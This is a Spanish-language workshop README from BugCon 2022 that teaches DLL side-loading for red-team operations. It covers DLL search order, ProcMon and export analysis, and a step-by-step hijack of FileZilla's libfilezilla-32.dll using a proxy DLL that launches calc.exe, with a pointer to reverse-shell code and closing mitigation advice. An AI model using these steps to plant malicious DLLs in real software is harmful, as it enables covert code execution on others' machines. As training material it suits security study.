# DLL-side-loading

Esta repo estda hecha para el taller de BugCon 2022 titulado Training DLL Side-Loading for Red Team Ops

# Objetivo

Enseñar al participante a identificar y explotar ejecutables para Windows vulnerables a DLL Side-Loading

# Identificando una DLL vulnerable
Antes de saber como identificar una DLL que sea vulnerable a side loading debes entender ¿qué es una DLL?
## ¿Qué es una DLL?
Como su nombre nos indica Dynamic Link Library (DLL) son archivos conocimos como bibliotecas de enlaces dinámicos. Estas bibliotecas ofrecen mediante sus "exports" funciónes específicas a las aplicaciónes que asi lo requieren.
Para que estas funciónes puedan ser utulizadas por aplicaciónes exiten 2 maneras de hacerlo
* At link time - Cuando un progrma se compila un __import table__ se escribe dentro de los headers del ejecutable (PE), esto quiere decir que cuando un progrma requiere una función que una librería exporta, se tiene que hacer referencia en esta tabla para saber que se usará como un "import"
* At run time - Si una librería se necesita en timepo de ejecución y esta no se encuentra en el __import table__ es posible cargar una librería en el espacio de memoria del proceso con las Windows APIs __LoadLibrary(),LoadLibraryEx()__ y para resolver la dirección de una función específica de la librería cargada se usa __GetProcAddress__
## LoadLibrary Windows API
Esta API de Windows es muy popular para cargar en la memoria de un proceso una DLL, esta API recibe el nombre de la DLL que se quiere cargar en la memoria del proceso.
Una vez que la función encuentra la librería que se quiere cargar, la DLL es mapeada en la memoria del proceso que invoca esta función y retorna un handle, este handle es importante para usar funciónes como __GetProcAddress__

Si a la __LoadLibrary__ se le pasa el path completo de la DLL que se quiere cargar, esta función buscara solamente en ese path, caso contrario se usará un orden de búsqueda predefinido.
### Function prototype
```c++
HMODULE LoadLibrary(
  [in] LPCWSTR lpLibFileName
);
```
### Path completo de la DLL
```c++
int main( void ) 
{ 
    HINSTANCE hinstLib; 

    hinstLib = LoadLibrary(TEXT("C:\\DLL\\MyCustom.dll")); 
    
    return 0;
}
```
### Nombre de la DLL
```c++
int main( void ) 
{ 
    HINSTANCE hinstLib; 

    hinstLib = LoadLibrary(TEXT("MyCustom.dll")); 
    
    return 0;
}
```
## Orden de búsqueda de las DLL
Si __LoadLibrary__ solo recibe el nombre de la DLL se usará el siguiente orden de búsqueda para encontrar la DLL y cargarla en memoria.

![Alt text](/images/search_order.jpg)

## Usando ProcMon para encontrar una DLL vulnerable
Para ver en acción cómo es que este orden de búsqueda funciona usaremos procmon con el binario __vuln_side_loading.exe__ que viene con la DLL __my_custom.dll__ dentro del zip [app_exaple.7z](ejemplo/app_example.7z) __NOTA: el pass del archivo comprimido es BugCon2022__
Puedes consultar el código de cada archivo se encuentra en [vuln_side_loading.exe](code/vuln_side_loading.cpp) y [my_custom.dll](code/my_custoom_dll.cpp)

### ProcMon
Process Monitor aka procmon es una herramienta de Windows que nos muestra en tiempo real el sistema de archivos, llaves de registro y process/thread activity.

En caso que no tengas procmon instalado, lo puedes descargar de aquí [Process Monitor v3.92](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

Antes de ver el orden de búsqueda observaremos como luce este pedazo de código desde procmon

```cpp
hinstLib = LoadLibrary(L"my_custom.dll");
```

Como se observa en la imagen tenemos que la __my_custom.dll__ es cargada desde el path de donde se ejecuta la aplicación.

![Alt text](/images/procmon_1.jpg)


Ahora veremos lo que pasa si la DLL no se encuentra en el path desde donde se ejecuta la aplicación

![Alt text](/images/procmon_2.jpg)

Como podemos observar el patron de búsqueda antes descrito se ejecuta correctamente.

# Explotación
## Arquitectura básica de la DLL
La parte más importante de la DLL se le conoce como Entry-Point.
Si este Entry-Poit no es declarado correctamente, la DLL no será cargada correctamente
La DLL cuenta con distintos escenarios donde la DLL va a ser llamada, estos son:
* DLL_PROCESS_ATTACH - El proceso carga la DLL
* DLL_THREAD_ATTACH - El proceso crea un nuevo thread
* DLL_THREAD_DETACH - El thread termina
* DLL_PROCESS_DETACH - El proceso cierra el handle de la DLL
A continuación vemos un ejemplo de un DLL Entry-Point
```cpp
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
```
## Analizando los exports de la DLL
Además del DLL Entry-Point una DLL tiene funciones que expone para su uso por atras aplicaciones, estas funciones son mejor conocidas como "exports".

Muchas veces cuando una DLL es cargada en memoria, en seguida se usa la función __GetProcAddress__ para obtener la dirección de alguna función, si esta dirección no es encontrada quizas el programa no funcióne correctamente y termine su ejecución, lo que hará que nuestra DLL sea removida de la memoria del programa evitando continuar con el ataque.

Para inspeccionar los "exports" que tiene una la DLL __C:\Windows\System32\uxtheme.dll__ usaremos [CFF explorer](https://ntcore.com/?page_id=388).

![Alt text](/images/cff_1.jpg)

Esa lista de "exports" son los que tenemos que satisfacer para que nuestra DLL apocrifa se haga pasar por la DLL que es vulnerable a side-loading

## Programando la DLL
Una vez tenemos los "exports que vamos a necesitar, comenzaremos un nuevo proyecto en visual estudio para compilar nuestra DLL.
## Programando el comportamiento malicioso
Se agrega el comportamiento malicioso que se desea, generalmete se hace en __DLL_PROCESS_ATTACH__
# Caso de uso Filezilla DLL side-loading
Para este caso usaremos la última versión del popular software de FTP [FilZilla](https://filezilla-project.org/download.php?type=client)

## Buscando la DLL
Primero buscaremos alguna DLL de las que carga el proceso __filezilla.exe__, para este fin usaremos procmon.

1. Mover la DLL a un directorio diferente al original
![Alt text](/images/step_1.jpg)
2. Agregar FZ_DATADIR con el path C:\Program Files\FileZilla FTP Client a las variables de entorno de Windows
![Alt text](/images/step_2.jpg)
3. Ejecutar procmon con filtros para ver que DLL se cargan
![Alt text](/images/step_3.jpg)
4. De las DLLs con Result = NAME NOT FOUND seleccionamos libfilezilla-32.dll
![Alt text](/images/step_4.jpg)
5. Revisamos los exports de libfilezilla-32.dll con CFF explorer
![Alt text](/images/step_5.jpg)
6. Con el script de python [exports.py](code/exports.py) obtenemos los exports que vamos a pegar en el proyecto de visual studio
7. Abrimos un nuevo proyecto de DLL en Visual Studio 2022
```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <process.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```
8. Pegamos los exports y agregamos una llamada a calc.exe
```cpp
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
//seccion de exports
extern "C" __declspec(dllexport)
BOOL __cdecl _ZN2fz10async_task4joinEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL __cdecl _ZN2fz10async_task6detachEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL __cdecl _ZN2fz10async_taskC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
//continua...
```
9.  Compilamos y probamos

## DLL side-loading to reverse shell
Aquí agregamos el código necesario para una [reverse shell en windows](code/windows_rev_sh.cpp) o puede ser el código de tu elección, solo asegúrate que sea para CPP en Windows.
# Recomendaciones de mitigación
* Usar el path absoluto para llamar a la DLL
* Emplear herramientas automatizadas para detectar esta vulnerabilidad
* Usar alguna solución que sea capaz de bloquear DLL maliciosas cargadas por software legítimo
# Referencias
* [LoadLibraryA function ](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
* [LoadLibrary and AfxLoadLibrary](https://learn.microsoft.com/en-us/cpp/build/loadlibrary-and-afxloadlibrary?view=msvc-170)
* [GetProcAddress function](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
* [Dynamic-Link Library Security](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security)
* [DllMain entry point](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain)
* [Dynamic-Link Library Entry-Point Function](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function)
* [Process Monitor v3.92](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
* [Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
* [Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
# Otros recursos
* [DLL SIDE-LOADING:A Thorn in the Side of the Anti-Virus Industry](https://www.mandiant.com/sites/default/files/2021-09/rpt-dll-sideloading.pdf)
* [DLL Side-Loading](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/untitled-5/dll-side-loading)
* [FileZilla DLL Side-Loading](https://www.metabaseq.com/recursos/filezilla-dll-side-loading#)